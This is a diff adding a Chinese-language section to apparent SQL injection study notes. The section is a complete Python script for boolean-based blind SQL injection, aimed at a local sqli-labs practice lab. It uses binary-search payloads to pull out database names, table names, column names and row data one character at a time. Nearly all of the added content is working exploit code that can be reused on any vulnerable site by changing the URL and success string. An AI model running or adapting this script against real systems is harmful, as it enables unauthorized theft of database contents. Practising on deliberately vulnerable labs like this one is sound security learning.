@@ -75,7 +75,257 @@
 - **宽字节注入**：利用 GBK 等多字节编码特性（如 `%df%27`），吃掉转义的反斜杠，从而绕过单引号过滤。
 
 
+# 盲注脚本
+```python
+import requests
 
+#需要爆破的网址
+url = 'http://127.0.0.1/sqli-labs-master/Less-8/'
+
+#请求头，避免被反爬
+headers = {
+    "user-agent":"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36 Edg/139.0.0.0"
+}
+
+#爆破成功后页面的回显（请确认这是唯一的，失败网页里面不会有）
+flag = 'You are in....'
+
+#设置最长库、表名
+max_len = 20
+
+# #0-9a-zA-Z的ascii码列表
+# keylist = [ord(i) for i in '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz']
+
+#0-9a-z的ascii码列表
+keylist = [ord(i) for i in '0123456789_abcdefghijklmnopqrstuvwxyz']
+
+#创建对话，用于保持请求
+session = requests.Session()
+
+#设置代理服务器
+# session.proxies={
+#     'http': 'http://127.0.0.1:10808',
+# }
+
+
+
+#检查本次请求是否包含flag
+def check(payload):
+    #请求参数
+    params = {
+        "id": payload
+    }
+#普通get请求
+    response = requests.get(url, headers=headers, params=params, timeout=10)
+#普通post请求
+    # response = requests.post(url, headers=headers, data=payload, timeout=10)
+#session get请求
+    # response = session.get(url, headers=headers, params=params, timeout=10)
+#session post请求
+    # response = session.post(url, data=params, headers = headers, timeout=10)
+
+    #print(response.text)
+    return flag in response.text
+
+
+
+def get_database():
+    db_name = ''
+    print("---------开始爆破当前数据库---------")
+    #依次爆破数据库每个字母，默认爆破次数为20
+    for i in range(max_len):
+        char=''
+        l, r = 0, len(keylist)
+        print(f'正在爆破第{i+1}个字符')
+        while l < r:
+            mid = (l+r)//2
+            ascii_char = keylist[mid]
+# select xx from xx where id = '1' ascii(substr(database(),1,1)) = char#' limit 0,1    拼接后的sql语句
+            payload1 = f"1' and ascii(substr(database(),{i+1},1))={ascii_char}#"
+            payload2 = f"1' and ascii(substr(database(),{i+1},1))>{ascii_char}#"
+
+            if check(payload1):
+                char=chr(ascii_char)
+                db_name += char
+                print(f'爆破成功,第{i+1}个字符为{chr(ascii_char)}')
+                break
+            elif check(payload2):
+                l = mid + 1
+            else:
+                r = mid
+        if not char:
+            print('已爆破完毕')
+            break
+    print(f'数据库名称为:{db_name}')
+    print("---------------------------")
+    return db_name
+
+
+def get_databases():
+    lst=[]
+    print('-------开始爆破所有数据库-------')
+    for i in range(max_len):
+        print(f'-----正在爆破第{i+1}个数据库的名称-----')
+        database_name=''
+        for j in range(max_len):
+            char=''
+            l, r = 0, len(keylist)
+            while l < r:
+                mid = (l+r)//2
+                ascii_char = keylist[mid]
+
+                payload1 = f"1' and ascii(substr((select schema_name from information_schema.schemata limit {i},1),{j + 1},1))={ascii_char}#"
+                payload2 = f"1' and ascii(substr((select schema_name from information_schema.schemata limit {i},1),{j + 1},1))>{ascii_char}#"
+
+                if check(payload1):
+                    char=chr(ascii_char)
+                    database_name += char
+                    print(f'爆破成功,第{j + 1}个字符为{char}')
+                    break
+                elif check(payload2):
+                    l = mid + 1
+                else:
+                    r = mid
+            if not char:
+                break
+        if not database_name:
+            break
+        print(f'数据库名称为:{database_name}')
+        lst.append(database_name)
+    return lst
+
+
+def get_tables(database):
+    lst=[]
+    for i in range(max_len):
+        table_name=''
+        for j in range(max_len):
+            char=''
+            l, r = 0, len(keylist)
+            while l < r:
+                mid = (l+r)//2
+                ascii_char = keylist[mid]
+
+                payload1 = f"1' and ascii(substr((select table_name from information_schema.tables where table_schema='{database}' limit {i},1),{j + 1},1))={ascii_char}#"
+                payload2 = f"1' and ascii(substr((select table_name from information_schema.tables where table_schema='{database}' limit {i},1),{j + 1},1))>{ascii_char}#"
+
+                if check(payload1):
+                    char=chr(ascii_char)
+                    table_name += char
+                    print(f'爆破成功,第{j + 1}个字符为{char}')
+                    break
+                elif check(payload2):
+                    l = mid + 1
+                else:
+                    r = mid
+            if not char:
+                break
+        if not table_name:
+            break
+        print(f'表名名称为:{table_name}')
+        lst.append(table_name)
+    return lst
+
+
+def get_columns(database,table):
+    lst=[]
+    for i in range(max_len):
+        column_name=''
+        for j in range(max_len):
+            char=''
+            l, r = 0, len(keylist)
+            while l < r:
+                mid = (l+r)//2
+                ascii_char = keylist[mid]
+
+                payload1 = f"1' and ascii(substr((select column_name from information_schema.columns where table_schema='{database}' and table_name='{table}' limit {i},1),{j + 1},1))={ascii_char}#"
+                payload2 = f"1' and ascii(substr((select column_name from information_schema.columns where table_schema='{database}' and table_name='{table}' limit {i},1),{j + 1},1))>{ascii_char}#"
+
+                if check(payload1):
+                    char=chr(ascii_char)
+                    column_name += char
+                    print(f'爆破成功,第{j + 1}个字符为{char}')
+                    break
+                elif check(payload2):
+                    l = mid + 1
+                else:
+                    r = mid
+            if not char:
+                break
+        if not column_name:
+            break
+        print(f'字段名名称为:{column_name}')
+        lst.append(column_name)
+    return lst
+
+
+#默认只查询10个数据（times）
+def get_datas(database,table,column,time=3):
+    lst = [column,]
+    for i in range(time):
+        data = ''
+        for j in range(max_len):
+            char = ''
+            l, r = 0, len(keylist)
+            while l < r:
+                mid = (l + r) // 2
+                ascii_char = keylist[mid]
+
+                payload1 = f"1' and ascii(substr((select {column} from {database}.{table} limit {i},1),{j + 1},1))={ascii_char}#"
+                payload2 = f"1' and ascii(substr((select {column} from {database}.{table} limit {i},1),{j + 1},1))>{ascii_char}#"
+
+                if check(payload1):
+                    char = chr(ascii_char)
+                    data += char
+                    print(f'爆破成功,第{j + 1}个字符为{char}')
+                    break
+                elif check(payload2):
+                    l = mid + 1
+                else:
+                    r = mid
+            if not char:
+                break
+        if not data:
+            break
+        print(f'数据为:{data}')
+        lst.append(data)
+    return lst
+
+
+if __name__ == '__main__':
+    print('sql盲注脚本开始运行')
+    database = get_database()
+    # databases = get_databases()
+
+    while True:
+        print(f'当前数据库:{database}')
+        # print(f'数据库列表:{databases}')
+
+        database = input('请输入想爆破的数据库名称\n')
+        tables = get_tables(database)
+        print(f'表名:{tables}')
+
+        table = input('请输入想要爆破的表名\n')
+        columns = get_columns(database,table)
+        print(f'字段名:{columns}')
+
+        column_lst = input('请输入想要托取的字段,请以空格分开\n').split()
+        i = 0
+        dic = {}
+
+        for column in column_lst:
+            lst_name = f'data_{i+1}'
+            i+=1
+            dic[lst_name] = get_datas(database,table,column)
+
+        for key in dic.keys():
+            print(dic[key])
+        choose = int(input('输入1继续，输入0退出\n'))
+        if not choose:
+            break
+    print('脚本运行结束')
+
+```
 # low
 太好了！万丈高楼平地起，我们从最经典的 **SQL 注入（SQL Injection）** 开始。这也是你一开始就提到的重点。
 
